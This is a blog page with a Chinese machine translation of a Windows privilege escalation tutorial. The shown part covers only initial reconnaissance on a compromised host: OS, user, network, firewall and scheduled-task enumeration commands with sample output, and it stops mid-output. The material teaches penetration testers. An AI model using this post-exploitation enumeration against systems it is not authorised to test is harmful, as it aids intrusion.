<!DOCTYPE html>
<html lang="zh-CN">










<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="One way to choose one">
    <meta name="author" content="Misaki">
    <meta name="keywords" content="">
    <title>Windows权限提升基础 ~ Misaki&#39;s Blog</title>
    <link rel="stylesheet" href="/css/Material_Icons.css">
    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/main.css">
    
        <link rel="stylesheet" href="/css/post.css">
        
            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
        
    
</head>

<body class=" sidebar-collapse">
<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
    <div class="container">
        <div class="navbar-translate">
            <a class="navbar-brand" href="/">
                Misaki&#39;s Blog</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="sr-only">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ml-auto">
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/archives/">
                                    archives
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/about/">
                                    about
                                </a>
                            </li>
                        
                    
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-twitch"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-envelope"></i>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
    </div>
</nav>
    
  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
    
      <div class="container">
        <h1 class="title text-center post_title">Windows权限提升基础</h1>
        <p class="text-center"><b>Monday, March 18th 2019, 1:29 pm</b></p>
      </div>
    
  </div>

  
  
  
    <div class="row" style="margin: 0 0 0; z-index: 999;">
  <div class="col-md-8 offset-md-1">
    <div class="main main-raised">
      <div class="container">
        <div class="section">
          <div class="post_content">
              <p>原文链接：<a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p>
<h1 id="Windows权限提升基础"><a href="#Windows权限提升基础" class="headerlink" title="Windows权限提升基础"></a>Windows权限提升基础</h1><p>没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer …</p>
<p>与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。</p>
<p>应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。</p>
<p>最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。</p>
<p>不可或缺的资源：<br>Windows Privilege Escalation百科全书（Brett Moore） -  <a href="http://www.youtube.com/watch?v=kMG8IsCohHA" target="_blank" rel="noopener">这里</a>。<br>Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） -  <a href="http://www.youtube.com/watch?v=_8xJaaQlpBo" target="_blank" rel="noopener">这里</a>。<br>通过利用弱文件夹权限提升权限（Parvez Anwar） -  <a href="http://www.greyhathacker.net/?p=738" target="_blank" rel="noopener">这里</a>。</p>
<h2 id="Δt-for-t0-to-t3-初始信息收集"><a href="#Δt-for-t0-to-t3-初始信息收集" class="headerlink" title="Δt for t0 to t3 - 初始信息收集"></a>Δt for t0 to t3 - 初始信息收集</h2><p>  本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。</p>
<p>最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。</p>
<p>首先让我们找出我们连接的操作系统：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">OS Name:                   Microsoft Windows 7 Professional</span><br><span class="line">OS Version:                6.1.7601 Service Pack 1 Build 7601</span><br></pre></td></tr></table></figure>
<p>接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; hostname</span><br><span class="line">b33f</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; echo %username%</span><br><span class="line">user1</span><br></pre></td></tr></table></figure>
<p>现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; net users</span><br><span class="line"></span><br><span class="line">User accounts for \\B33F</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            b33f                     Guest</span><br><span class="line">user1</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; net user user1</span><br><span class="line"></span><br><span class="line">User name                    user1</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User&apos;s comment</span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            1/11/2014 7:47:14 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          1/11/2014 7:47:14 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   1/11/2014 8:05:09 PM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users</span><br><span class="line">Global Group memberships     *None</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p> 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。</p>
<p>首先让我们看一下可用的网络接口和路由表。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; ipconfig /all</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : b33f</span><br><span class="line">   Primary Dns Suffix  . . . . . . . :</span><br><span class="line">   Node Type . . . . . . . . . . . . : Hybrid</span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line"></span><br><span class="line">Ethernet adapter Bluetooth Network Connection:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . :</span><br><span class="line">   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</span><br><span class="line">   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</span><br><span class="line">   DHCP Enabled. . . . . . . . . . . : Yes</span><br><span class="line">   Autoconfiguration Enabled . . . . : Yes</span><br><span class="line">   </span><br><span class="line">Ethernet adapter Local Area Connection:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . :</span><br><span class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</span><br><span class="line">   DHCP Enabled. . . . . . . . . . . : Yes</span><br><span class="line">   Autoconfiguration Enabled . . . . : Yes</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</span><br><span class="line">   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.0.1</span><br><span class="line">   DHCP Server . . . . . . . . . . . : 192.168.0.1</span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</span><br><span class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</span><br><span class="line">   DNS Servers . . . . . . . . . . . : 192.168.0.1</span><br><span class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; route print</span><br><span class="line"></span><br><span class="line">===========================================================================</span><br><span class="line">Interface List</span><br><span class="line"> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</span><br><span class="line"> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</span><br><span class="line"> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">  1...........................Software Loopback Interface 1</span><br><span class="line"> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</span><br><span class="line"> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</span><br><span class="line"> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</span><br><span class="line"> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">IPv4 Route Table</span><br><span class="line">===========================================================================</span><br><span class="line">Active Routes:</span><br><span class="line">Network Destination        Netmask          Gateway       Interface  Metric</span><br><span class="line">          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</span><br><span class="line">        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</span><br><span class="line">        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</span><br><span class="line">  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</span><br><span class="line">      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</span><br><span class="line">    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</span><br><span class="line">    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</span><br><span class="line">        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</span><br><span class="line">        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</span><br><span class="line">  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</span><br><span class="line">  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</span><br><span class="line">===========================================================================</span><br><span class="line">Persistent Routes:</span><br><span class="line">  None</span><br><span class="line"></span><br><span class="line">IPv6 Route Table</span><br><span class="line">===========================================================================</span><br><span class="line">Active Routes:</span><br><span class="line"> If Metric Network Destination      Gateway</span><br><span class="line"> 14     58 ::/0                     On-link</span><br><span class="line">  1    306 ::1/128                  On-link</span><br><span class="line"> 14     58 2001::/32                On-link</span><br><span class="line"> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</span><br><span class="line">                                    On-link</span><br><span class="line"> 11    266 fe80::/64                On-link</span><br><span class="line"> 14    306 fe80::/64                On-link</span><br><span class="line"> 14    306 fe80::8d2:b4e:3f57:ff97/128</span><br><span class="line">                                    On-link</span><br><span class="line"> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</span><br><span class="line">                                    On-link</span><br><span class="line">  1    306 ff00::/8                 On-link</span><br><span class="line"> 14    306 ff00::/8                 On-link</span><br><span class="line"> 11    266 ff00::/8                 On-link</span><br><span class="line">===========================================================================</span><br><span class="line">Persistent Routes:</span><br><span class="line">  None</span><br><span class="line">  </span><br><span class="line"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; arp -A</span><br><span class="line"></span><br><span class="line">Interface: 192.168.0.104 --- 0xb</span><br><span class="line">  Internet Address      Physical Address      Type</span><br><span class="line">  192.168.0.1           90-94-e4-c5-b0-46     dynamic</span><br><span class="line">  192.168.0.101         ac-22-0b-af-bb-43     dynamic</span><br><span class="line">  192.168.0.255         ff-ff-ff-ff-ff-ff     static</span><br><span class="line">  224.0.0.22            01-00-5e-00-00-16     static</span><br><span class="line">  224.0.0.251           01-00-5e-00-00-fb     static</span><br><span class="line">  224.0.0.252           01-00-5e-00-00-fc     static</span><br><span class="line">  239.255.255.250       01-00-5e-7f-ff-fa     static</span><br><span class="line">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</span><br></pre></td></tr></table></figure>
<p>这将我们带到活动网络连接和防火墙规则。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</span><br><span class="line">  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       684</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    1100</span><br><span class="line">  UDP    0.0.0.0:52282          *:*                                    976</span><br><span class="line">  UDP    0.0.0.0:55202          *:*                                    2956</span><br><span class="line">  UDP    0.0.0.0:59797          *:*                                    1400</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    2956</span><br><span class="line">  UDP    127.0.0.1:65435        *:*                                    2956</span><br><span class="line">  UDP    192.168.0.104:137      *:*                                    4</span><br><span class="line">  UDP    192.168.0.104:138      *:*                                    4</span><br><span class="line">  UDP    192.168.0.104:1900     *:*                                    2956</span><br><span class="line">  UDP    192.168.0.104:5353     *:*                                    1400</span><br><span class="line">  UDP    192.168.0.104:65434    *:*                                    2956</span><br><span class="line">  UDP    [::]:5355              *:*                                    1100</span><br><span class="line">  UDP    [::]:52281             *:*                                    976</span><br><span class="line">  UDP    [::]:52283             *:*                                    976</span><br><span class="line">  UDP    [::]:55203             *:*                                    2956</span><br><span class="line">  UDP    [::]:59798             *:*                                    1400</span><br><span class="line">  UDP    [::1]:1900             *:*                                    2956</span><br><span class="line">  UDP    [::1]:5353             *:*                                    1400</span><br><span class="line">  UDP    [::1]:65433            *:*                                    2956</span><br><span class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</span><br><span class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</span><br><span class="line">  </span><br><span class="line"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</span><br><span class="line">firewall commands are only available from XP SP2 and upwards.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; netsh firewall show state</span><br><span class="line"></span><br><span class="line">Firewall status:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Profile                           = Standard</span><br><span class="line">Operational mode                  = Enable</span><br><span class="line">Exception mode                    = Enable</span><br><span class="line">Multicast/broadcast response mode = Enable</span><br><span class="line">Notification mode                 = Enable</span><br><span class="line">Group policy version              = Windows Firewall</span><br><span class="line">Remote admin mode                 = Disable</span><br><span class="line"></span><br><span class="line">Ports currently open on all network interfaces:</span><br><span class="line">Port   Protocol  Version  Program</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">No ports are currently open on all network interfaces.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; netsh firewall show config</span><br><span class="line"></span><br><span class="line">Domain profile configuration:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Operational mode                  = Enable</span><br><span class="line">Exception mode                    = Enable</span><br><span class="line">Multicast/broadcast response mode = Enable</span><br><span class="line">Notification mode                 = Enable</span><br><span class="line"></span><br><span class="line">Allowed programs configuration for Domain profile:</span><br><span class="line">Mode     Traffic direction    Name / Program</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Port configuration for Domain profile:</span><br><span class="line">Port   Protocol  Mode    Traffic direction     Name</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">ICMP configuration for Domain profile:</span><br><span class="line">Mode     Type  Description</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Enable   2     Allow outbound packet too big</span><br><span class="line"></span><br><span class="line">Standard profile configuration (current):</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Operational mode                  = Enable</span><br><span class="line">Exception mode                    = Enable</span><br><span class="line">Multicast/broadcast response mode = Enable</span><br><span class="line">Notification mode                 = Enable</span><br><span class="line"></span><br><span class="line">Service configuration for Standard profile:</span><br><span class="line">Mode     Customized  Name</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Enable   No          Network Discovery</span><br><span class="line"></span><br><span class="line">Allowed programs configuration for Standard profile:</span><br><span class="line">Mode     Traffic direction    Name / Program</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Enable   Inbound              COMRaider / E:\comraider\comraider.exe</span><br><span class="line">Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</span><br><span class="line"></span><br><span class="line">Port configuration for Standard profile:</span><br><span class="line">Port   Protocol  Mode    Traffic direction     Name</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">ICMP configuration for Standard profile:</span><br><span class="line">Mode     Type  Description</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">Enable   2     Allow outbound packet too big</span><br><span class="line"></span><br><span class="line">Log configuration:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">Max file size   = 4096 KB</span><br><span class="line">Dropped packets = Disable</span><br><span class="line">Connections     = Disable</span><br></pre></td></tr></table></figure>
<p>最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"># This will display verbose output for all scheduled tasks, below you can see sample output for a</span><br><span class="line">single task.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line">Folder: \Microsoft\Windows Defender</span><br><span class="line">HostName:                             B33F</span><br><span class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</span><br><span class="line">Next Run Time:                        1/22/2014 5:11:13 AM</span><br><span class="line">Status:                               Ready</span><br><span class="line">Logon Mode:                           Interactive/Background</span><br><span class="line">Last Run Time:                        N/A</span><br><span class="line">Last Result:                          1</span><br><span class="line">Author:                               N/A</span><br><span class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</span><br><span class="line">                                      -WinTask -RestrictPrivilegesScan</span><br><span class="line">Start In:                             N/A</span><br><span class="line">Comment:                              Scheduled Scan</span><br><span class="line">Scheduled Task State:                 Enabled</span><br><span class="line">Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle 